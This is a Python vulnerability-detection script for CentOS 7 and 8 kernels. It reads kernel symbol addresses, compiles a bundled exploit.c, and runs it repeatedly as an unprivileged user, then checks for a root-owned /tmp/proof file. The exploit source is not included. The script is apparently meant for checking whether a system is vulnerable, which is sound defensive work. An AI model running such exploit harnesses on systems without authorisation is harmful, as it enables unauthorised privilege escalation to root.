#!/usr/bin/env python

#                  I
#                 ,I~
#                 II7             __      __                 _____                  _   _
#     ,:         :I+7~          : \ \    / /                / ____|                (_) | |
#       ~~       77+?7       ,==   \ \  / /    ___   _ __  | (___    _ __    _ __   _  | |_    ___
#        ===,   =II+ 7+    :~==,    \ \/ /    / _ \ | '__|  \___ \  | '_ \  | '__| | | | __|  / _ \
#         =+, ,=III77777=  ~~~       \  /    |  __/ | |     ____) | | |_) | | |    | | | |_  |  __/
#         ,  ?IIII77777777: :         \/      \___| |_|    |_____/  | .__/  |_|    |_|  \__|  \___|
#           IIIIII77777777$~                                        | |
#         ~?II~   ?7I   ,77$7=                                      |_|
#    :=???+IIIII   7    77$$$$$$$I:
# :++??+~::IIIII=     :I77$$7IIII$$Z7=
#   ~??????IIIII7,    7777$$::I7$Z7=
#       ,+I?IIIII7   77777$$$7+:
#           ?IIIII7 I77777$,
#            =IIIIII777777         ______                   _                      _        _____                                _   _
#         ~=:  ,I777777I,  ~=     |  ____|                 | |                    | |      / ____|                              (_) | |
#        ~===,  :I,+77~   ~~==    | |__    __   __   ___   | | __   __   ___    __| |     | (___     ___    ___   _   _   _ __   _  | |_   _   _
#       :=~      I7+77      :==,  |  __|   \ \ / /  / _ \  | | \ \ / /  / _ \  / _` |      \___ \   / _ \  / __| | | | | | '__| | | | __| | | | |
#      ,:        ,7I7:        ,~, | |____   \ V /  | (_) | | |  \ V /  |  __/ | (_| |      ____) | |  __/ | (__  | |_| | | |    | | | |_  | |_| |
#                 I7I             |______|   \_/    \___/  |_|   \_/    \___|  \__,_|     |_____/   \___|  \___|  \__,_| |_|    |_|  \__|  \__, |
#                  7,                                                                                                                       __/ |
#                  =                                                                                                                       |___/
#
# Detect script by @meecles
#
from pathlib import Path
from shutil import copyfile
import subprocess
import os
import sys
sub_uname = subprocess.run(['uname', '-r'], stdout=subprocess.PIPE)
version = sub_uname.stdout.decode("utf-8").rstrip()
elversion = version.split(".")[len(version.split(".")) - 2]
depriv_user = None
sysmap = "/boot/System.map-{}".format(version)
exploit_setup = False

def is_root():
    return os.geteuid() == 0

def get_addr(item):
    sub = subprocess.run(["grep", item, sysmap], stdout=subprocess.PIPE)
    return sub.stdout.decode("utf-8").rstrip()

def recompile():
    os.system("cp symbols.c symbols.c.bak")
    os.system("rm symbols.c")
    sub = subprocess.run(["sh", "utilities/build_symbols.sh"], stdout=subprocess.PIPE)
    res = sub.stdout.decode("utf-8").rstrip()
    arr = res.split("//###")
    syms = arr[0]
    inject = arr[1]
    new_lines = []
    template = open("symbols.template.c", "r")
    lines = template.readlines()
    for line in lines:
        if "##ARR_SYMBOLS##" in line:
            new_lines.append(syms + "\n")
        elif "##ARR_ADD##" in line:
            new_lines.append(inject + "\n")
        else:
            new_lines.append(line)
    symbols = open("symbols.c", "w")
    symbols.writelines(new_lines)
    symbols.close()
    return True

def setup_exploit(add_symbols=False):
    global exploit_setup
    files = ["a.sh", "exploit.c", "Makefile"]  # Check if some of the files exist
    for file in files:
        p = Path("./{}".format(file))
        if not p.is_file():
            return False
    if add_symbols:
        recompile()
    copyfile("a.sh", "/tmp/a.sh")
    os.system("chmod +x /tmp/a.sh")
    os.system("make")
    exploit_setup = True
    return True

def run_exploit():
    # We're root, so run as a deprivileged user
    sub = subprocess.run(["su", "-c", "./exploit", depriv_user], stdout=subprocess.PIPE)
    res = sub.stdout.decode("utf-8").rstrip()
    return res

def check(vers="Unknown Version"):
    global symbol_mem
    global symbol_touser
    print("{} detected, checking for symbols".format(vers))
    if vers != "CentOS 8" or vers.startswith("CentOS 8"):
        print("Recompiling to add symbol offsets")
        setup_exploit(add_symbols=True)
        print("Built, continuing")
    required_symbols = [
        "\<seq_buf_putmem\>", "\<seq_buf_to_user\>", "module_kset", "param_array_free", "\<memcpy\>", "\<modules\>",
        "run_cmd", "\<netlink_sock_destruct$"
    ]
    for symbol in required_symbols:
        sym = get_addr(symbol)
        if len(sym) < 1:
            print("Failed to read symbols")
            return False
    print("Found all the symbols")
    success = False
    res = None
    for i in range(0, 20 if "-fast" not in sys.argv else 3):
        res = run_exploit()
        if res.endswith("Success"):
            success = True
            break
    if success:
        print("Exploit ran!")
        return True
    if res is not None and res.endswith("Failed to detect kernel slide"):
        print("Exploit failed, but is likely to succeed if you reboot. Most likely vulnerable.")
        return False
    print("Failed to run exploit but found symbols, possibly vulnerable but current exploit not possible")
    return False

def verify_success():
    sub = subprocess.run(["ls", "-l", "/tmp/proof"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    res = sub.stdout.decode("utf-8").rstrip()
    er = sub.stderr.decode("utf-8").rstrip()
    return res is not None and len(res) > 5 and "root" in res and depriv_user not in res

if __name__ == '__main__':
    if not is_root():
        print("Please run with sudo or as root")
        quit()
    if len(sys.argv) > 1:
        depriv_user = sys.argv[1]
    if depriv_user is None:
        print("Please provide username of non-admin user\nUsage: python3 detect.py user")
        quit()
    if "-compile" in sys.argv:
        recompile()
        quit()
    if elversion == "el8" or elversion.startswith("el8"):
        num = "8"
        if elversion != "el8" and "_" in elversion:
            num = "8." + elversion.split("_")[1]
        if check(vers="CentOS {}".format(num)):
            verified = verify_success()
            if verified:
                print("Vulnerable!")
            else:
                print("Exploit ran, but was unable to verify that it worked")
        else:
            print("Not vulnerable!")
    elif elversion == "el7":
        if check(vers="CentOS 7"):
            verified = verify_success()
            if verified:
                print("Vulnerable!")
            else:
                print("Exploit ran, but was unable to verify that it worked")
        else:
            print("Not vulnerable!")
    else:
        success = check()
        if success:
            print("Found memory symbols")
    verify_success()
